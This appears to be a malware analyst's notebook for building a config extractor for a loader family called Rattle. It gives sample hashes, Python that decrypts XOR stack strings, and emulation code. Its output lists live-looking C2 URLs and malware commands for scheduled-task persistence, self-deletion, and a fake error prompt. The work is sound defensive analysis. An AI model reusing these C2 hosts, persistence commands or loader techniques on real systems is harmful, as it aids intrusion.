4b87f95c4477fc66c58b8e16a74f9c47217913cb4a78dc69f27a364a099acd90 | 4eb85a5532b98cbc4a6db1697cf46b9e2b7e28e89d6bbfc137b36c0736cd80e2 | . More samples from Rattle (these work with our existing tools) . 67a9e8599ab71865a97e75dae9be438c24d015a93e6a12fb5b450ec558528290 | 075c904c5e18cd49f7d48f0fd1fc67d0921d51c7effb9233a3c92fbfa4f218ed | 60f030597c75f9df0f7a494cb5432b600d41775cfe5cf13006c1448fa3a68d8d | . These samples don&#39;t work with our first version of the config extractor: . e58b9bbb7bcdf3e901453b7b9c9e514fed1e53565e3280353dccc77cde26a98e.bin | b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e.bin | . New Config Extractor - Static String Decryption Notes . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import re import struct import pefile FILE_PATH = &#39;/tmp/samples/e58b9bbb7bcdf3e901453b7b9c9e514fed1e53565e3280353dccc77cde26a98e.bin&#39; FILE_PATH = &#39;/tmp/samples/orig.bin&#39; FILE_PATH = &#39;/tmp/samples/bd_rony.bin&#39; file_data = open(FILE_PATH,&#39;rb&#39;).read() def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(data): return re.match(B&quot;^[ s!-~]+ 0*$&quot;, data) is not None def filter(data): return re.match(rb&#39;[ f v t]&#39;, data) is not None stack_strings = [] #string_egg = rb&#39;( xC6 x45..){2,}&#39; string_egg = rb&#39;(?P&lt;a&gt;(?: xC6 x85.{5}){0,})(?P&lt;b&gt;(?: xC6 x45..){1,})&#39; for m in re.finditer(string_egg, file_data): match_data = m.group(0) #stack_strings.append({&quot;data&quot;:match_data.replace(b&#39; xC6 x45&#39;,b&#39;&#39;)[1::2], &quot;match&quot;:match_data}) stack_strings.append({&quot;data&quot;:m[&#39;a&#39;][6::7] + m[&#39;b&#39;][3::4], &quot;match&quot;:match_data}) keys = [] key_byte_len_egg = rb&#39; x68(....) x68(....) x6a x00 x6a(.)&#39; for m in re.finditer(key_byte_len_egg, file_data): keys.append( {&#39;key&#39;:m.group(2) + m.group(1), &#39;length&#39;:ord(m.group(3))}) key_dw_len_egg = rb&#39; x68(....) x68(....) x6a x00 x68(....)&#39; for m in re.finditer(key_dw_len_egg, file_data): keys.append( {&#39;key&#39;:m.group(2) + m.group(1), &#39;length&#39;:struct.unpack(&#39;&lt;I&#39;,m.group(3))[0]}) for sj in stack_strings: s = sj.get(&#39;data&#39;) str_len = len(s) if str_len &lt; 5: continue #print(f&quot; n n{str_len}&quot;) flag_found = False #print(&#39; n&#39;) #print(f&#39;{tohex(sj.get(&quot;match&quot;))}&#39;) tmp_strings = [] for k in keys: if k.get(&#39;length&#39;) == str_len: #print(f&quot;found key: {tohex(k.get(&#39;key&#39;))}&quot;) out = xor_decrypt(s, k.get(&#39;key&#39;)) if is_ascii(out) and not filter(out): tmp_strings.append(out) flag_found = True if not flag_found: tmp_xoe_dec = xor_decrypt(s[1:-1], bytes([s[0]])) if is_ascii(tmp_xoe_dec) and not filter(tmp_xoe_dec): print(tmp_xoe_dec) else: #print(f&quot; n{tmp_strings}&quot;) spec_char_egg = rb&#39;[^A-Za-z0-9 s ./ %]{1}&#39; best_match = min( (len(re.findall(spec_char_egg, s)),s) for s in tmp_strings )[1] print(best_match) . b&#39;Content-Length: x00&#39; b&#39;C: Windows System32 WindowsPowerShell v1.0 powershell.exe x00&#39; b&#39;collectiontelemetrysystem.com x00&#39; b&#39;DllRegisterServer x00&#39; b&#39;097f5m x00&#39; b&#39;Running dll in memory #3 (DllInstall(Unstall)) x00&#39; b&#39;runas x00&#39; b&#39;.exe x00&#39; b&#39;timeout /t 3 &amp;&amp; move /Y x00&#39; b&#39;Running dll in memory #3 (DllInstall(Install)) x00&#39; b&#39;.exe x00&#39; b&#39;.exe x00&#39; b&#39;TiC7 x00&#39; b&#39;.nls x00&#39; b&#39;Run PS in memory x00&#39; b&#39;Admin x00&#39; b&#39;%LOCALAPPDATA% x00&#39; b&#39;DllInstall x00&#39; b&#39;cmd.exe /c x00&#39; b&#39;collectiontelemetrysystem.com x00&#39; b&#39;Not in domain x00&#39; b&#39;regsvr32.exe x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;%APPDATA% x00&#39; b&#39;41.4.0 x00&#39; b&#39;8QN04 x00&#39; b&#39;64 Bit x00&#39; b&#39;8S2x x00&#39; b&#39;Starting the exe with parameters x00&#39; b&#39;C: Windows System32 cmd.exe /c x00&#39; b&#39;cmd.exe /c x00&#39; b&#39;High start exe x00&#39; b&#39;Running exe x00&#39; b&#39;User-Agent: x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;Content-Type: application/x-www-form-urlencoded x00&#39; b&#39;%APPDATA% x00&#39; b&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ x00&#39; b&#39; explorer.exe x00&#39; b&#39;MemLoadDllMain || MemLoadExe x00&#39; b&#39;Run CMD in memory x00&#39; b&#39;3CEk x00&#39; b&#39;3m7x x00&#39; b&#39;.nls x00&#39; b&#39;%APPDATA% x00&#39; b&#39;NCST x00&#39; b&#39;BCha x00&#39; b&#34;/c ECHO &#39;You must restart the program to resolve a critical error!&#39; &amp;&amp; start x00&#34; b&#39;7eriel x00&#39; b&#39;%APPDATA% x00&#39; b&#39;.nls x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#34; &#39;z{VIS rA6 rb x00&#34; b&#39;%LOCALAPPDATA% x00&#39; b&#39;IsWow64Process x00&#39; b&#39;rundll32.exe x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;kernel32 x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;.nls x00&#39; b&#39;User x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;.nls x00&#39; b&#39; r n r n x00&#39; b&#39; rXOGONSEzBER% x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39; nost: x00&#39; b&#39;MemLoadShellCode x00&#39; b&#39;Q6X6 x00&#39; b&#39;timeout /t 3 &amp;&amp; del x00&#39; b&#39;cmd.exe x00&#39; b&#39;%02X-%02X-%02X-%02X-%02X-%02X x00&#39; b&#39;Running dll in memory #2 (DllRegisterServer) x00&#39; b&#39;Crypt update &amp; Bots upgrade x00&#39; b&#39;timeout /t 3 &amp;&amp; del x00&#39; b&#39;3fe11 x00&#39; b&#39;%PROCESSOR_ARCHITECTURE% x00&#39; b&#39;%PROCESSOR_ARCHITECTURE% x00&#39; b&#39;NSeyDX x00&#39; b&#39;%APPDATA% x00&#39; b&#39;4nes x00&#39; b&#39;jpofxs x00&#39; b&#39;Not in domain x00&#39; b&#39;DllInstall x00&#39; b&#39; &amp;&amp; rd /s /q x00&#39; b&#39; &amp;&amp; regsvr32.exe -e &#34; x00&#39; b&#39;32 Bit x00&#39; b&#39;%USERDOMAIN% x00&#39; . Final Config Decryptor . import re import struct import pefile def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(data): return re.match(B&quot;^[ s!-~]+ 0*$&quot;, data) is not None def get_strings(file_path): file_data = open(file_path,&#39;rb&#39;).read() stack_strings = [] #string_egg = rb&#39;( xC6 x45..){2,}&#39; string_egg = rb&#39;(?P&lt;a&gt;(?: xC6 x85.{5}){0,})(?P&lt;b&gt;(?: xC6 x45..){3,})&#39; for m in re.finditer(string_egg, file_data): match_data = m.group(0) #stack_strings.append({&quot;data&quot;:match_data.replace(b&#39; xC6 x45&#39;,b&#39;&#39;)[1::2], &quot;match&quot;:match_data}) stack_strings.append({&quot;data&quot;:m[&#39;a&#39;][6::7] + m[&#39;b&#39;][3::4], &quot;match&quot;:match_data}) keys = [] key_byte_len_egg = rb&#39; x68(....) x68(....) x6a x00 x6a(.)&#39; for m in re.finditer(key_byte_len_egg, file_data): keys.append( {&#39;key&#39;:m.group(2) + m.group(1), &#39;length&#39;:ord(m.group(3))}) key_dw_len_egg = rb&#39; x68(....) x68(....) x6a x00 x68(....)&#39; for m in re.finditer(key_dw_len_egg, file_data): keys.append( {&#39;key&#39;:m.group(2) + m.group(1), &#39;length&#39;:struct.unpack(&#39;&lt;I&#39;,m.group(3))[0]}) out_strings = [] for sj in stack_strings: s = sj.get(&#39;data&#39;) str_len = len(s) flag_found = False tmp_out = [] for k in keys: if k.get(&#39;length&#39;) == str_len: out = xor_decrypt(s, k.get(&#39;key&#39;)) if is_ascii(out): tmp_out.append(out) if len(tmp_out) == 0: out = xor_decrypt(s[1:-1], bytes([s[0]])) if is_ascii(out): out_strings.append(out) elif len(tmp_out) == 1: out_strings.append(tmp_out[0]) else: # This is a hack # We have strings that will give valid ascii for multiple keys # So far these have only been dll names for out in tmp_out: if out[:-3].lower() == b&#39;dll&#39;: out_strings.append(out) break return list(set(out_strings)) . Test All Samples . get_strings(FILE_PATH) import os for filename in os.listdir(&#39;/tmp/samples&#39;): if filename.endswith(&quot;.bin&quot;): file_path = os.path.join(&#39;/tmp/samples&#39;, filename) print(f&quot; n{file_path}&quot;) print(get_strings(file_path)) . /tmp/samples/55d329a13da236bec15c4c67686b809a2fbf5f6c9625b62d900ac22a7b729ba9.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/4b87f95c4477fc66c58b8e16a74f9c47217913cb4a78dc69f27a364a099acd90.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/0bdf1060b85ad55e73393eb0b59c1d226e091da4f4dcce65dacba5e9a1fd76a7.bin [b&#39;VirtualAlloc&#39;, b&#39;start dll HackCheck&#39;, b&#39;http://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;kernel32.dll&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;Netapi32.dll x00&#39;, b&#39;LoadLibraryA&#39;, b&#39;http://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Microsoft Outlook 16.0.5197; ms-office; MSOffice 16) x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;Wkscli.dll x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;VirtualFree&#39;, b&#39;https://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/3cae2ce9b2d7040292f1661af63dc28e778027c46f78d8be3b1d43f4b6c2b046.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/b4e7710488c2b7aaa71688b8bd546410af07a215c2e835e8dfbe24887186bd4f.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/orig.bin [b&#39;VirtualAlloc&#39;, b&#39;start dll HackCheck&#39;, b&#39;http://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;kernel32.dll&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;Netapi32.dll x00&#39;, b&#39;LoadLibraryA&#39;, b&#39;http://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Microsoft Outlook 16.0.5197; ms-office; MSOffice 16) x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;Wkscli.dll x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;VirtualFree&#39;, b&#39;https://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/2f36c571f20b2b2c2058d4db574a6d53b148450356bf529d72aefc19505c912e.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/4eb85a5532b98cbc4a6db1697cf46b9e2b7e28e89d6bbfc137b36c0736cd80e2.bin [b&#39;rundll32.exe x00&#39;, b&#39;ztCYGAuJ x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;https://windowsdriverupdate.at/V.asp x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.13127; Pro) x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;https://windowsdriverupdate.at/ZBEr.asp x00&#39;, b&#39;Dll Uinstall x00&#39;, b&#39;%PROCESSOR_LEVEL% x00&#39;, b&#39;https://driverwindowsupdate.at/V.asp x00&#39;, b&#39;UnregisterServer x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;%PROCESSOR_REVISION% x00&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;&#34;C: Windows system32 schtasks.exe&#34; /Create /SC MINUTE /MO 1 /TN x00&#39;] /tmp/samples/10d5483faf9a4e0fbc17556164f47f7014650797b7d501289b269515a0853b64.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/58a673023bbc7f2726e3b7ac917a43d9306692dc87b638ee21b98705a3262ccd.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e.bin [] /tmp/samples/fa6500946210334d397d612d5ee9b11456316e25672bc60c1267bbdb002af9c7.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/60f030597c75f9df0f7a494cb5432b600d41775cfe5cf13006c1448fa3a68d8d.bin [b&#39;VirtualAlloc&#39;, b&#39;start dll HackCheck&#39;, b&#39;http://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;kernel32.dll&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;Netapi32.dll x00&#39;, b&#39;LoadLibraryA&#39;, b&#39;http://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Microsoft Outlook 16.0.5197; ms-office; MSOffice 16) x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;Wkscli.dll x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;VirtualFree&#39;, b&#39;https://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/e58b9bbb7bcdf3e901453b7b9c9e514fed1e53565e3280353dccc77cde26a98e.bin [b&#39;C: Windows System32 schtasks.exe x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39; /TR &#34;%windir% system32 regsvr32.exe -e x00&#39;, b&#39;%ProgramData% x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;%PROGRAMFILES% Opera Opera.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;Dll Uinstall x00&#39;, b&#39;%COMPUTERNAME% x00&#39;, b&#39;https://manageintel.com/RKyiihqXQiyE/xukYadevoVow/BhJM.xml x00&#39;, b&#39;UnregisterServer x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://manageintel.com/RKyiihqXQiyE/xukYadevoVow/QXms.xml x00&#39;, b&#39;.ocx x00&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL% x00&#39;, b&#39;%PROCESSOR_REVISION% x00&#39;] /tmp/samples/a3c896e23c86e47bcb77096e743010546cd7699e0189344d11b9c642b89deef1.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/f27821dddb17b6c8d59fb2ada1e90eac8d561476e5af3a6be064177683b0eee9.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] . Sample Using ADV String Obfuscation . A newer sample uses some type of ADV string obfuscation b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e. We can probably use our old dumpulator tricks for this. . The start of the .text section contains a vtable with all of the string decryption functions. . from dumpulator import Dumpulator, syscall from dumpulator.native import * @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS dp = Dumpulator(&quot;/tmp/b9b.dmp&quot;, quiet=True) dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) functs = [0x74040976,0x740409A4,0x740409BA,0x74040998,0x7404098C,0x7403F910,0x7403F91C,0x7403F967,0x7403F9B2,0x7403F9FD,0x7403FA48,0x7403FA93,0x7403FADE,0x7403FB44,0x7403FBAE,0x7403FC20,0x7403FC98,0x7403FD06,0x7403FD74,0x7403FDDD,0x7403FE43,0x7403FEBF,0x7403FF46,0x7403FFD5,0x74040065,0x740400DC,0x74040146,0x740401A2,0x740401FE,0x7404025A,0x740402B6,0x74040312,0x74040378,0x740403D4,0x74040438,0x7404048B,0x740404DE,0x74040542,0x7404059E,0x740405F1,0x74040644,0x740406A0,0x74040706,0x7404074F,0x740407AB,0x74040807,0x7404085A,0x740408B6,0x7404091A] for fn in functs: dp.call(fn,[]) str_tbl_start = 0x7407FDB4 str_tbl_end = 0x7407FE7C str_tbl_start = 0x7407E000 str_tbl_end = 0x74080224 for ptr in range(str_tbl_start,str_tbl_end,4): try: ss = dp.read_str(dp.read_ptr(ptr)) if len(ss) &gt; 4: print(ss) except: continue . Failed to read module data C: Users IEUser Desktop DLLLoader32_82D6.exe &#34;C: Users IEUser Desktop DLLLoader32_82D6.exe&#34; e03ed Uninstall 3fe11 Running exe Starting the exe with parameters Run CMD in memory Run PS in memory Running dll in memory #3 (DllInstall(Unstall)) Running dll in memory #3 (DllInstall(Install)) Regsvr32 &amp; Execute MemLoadDllMain || MemLoadExe zNETjp 5deb9c Run EXE with admin rights TAMfm RunDll32 &amp; Execute Crypt update &amp; 